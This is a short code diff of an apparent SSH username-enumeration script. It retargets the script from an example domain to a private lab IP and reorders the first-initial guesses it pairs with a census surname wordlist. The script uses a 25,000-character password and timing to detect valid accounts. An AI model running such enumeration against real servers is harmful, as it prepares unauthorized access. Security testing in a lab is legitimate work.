@@ -19,7 +19,8 @@ import time
 import string
 
 file='wordlists/US-census2000-lastnames-top-100.txt'
-host='www.example.com'
+#host='www.example.com'
+host='10.99.99.124'
 password='A'*25000
 port=22
 
@@ -27,10 +28,10 @@ port=22
 guessinitial=1
 
 # Most popular first name initials in order, per the 1990 US census:
-# initials="mjscladekbrtpgnvhfiwoyzuqx"
+# initials="jmrdcaslbetkgpwhnfvioyzqux"
 #
-# First initials to guess, omits z, u, q and x. Season to taste
-initials="mjscladekbrtpgnvhfiwoy"
+# First initials to guess, omits z, q, u and x. Season to taste
+initials="jmrdcaslbetkgpwhnfvioy"
 
 def sshconnect(host, user, port, password):
   starttime=time.time()
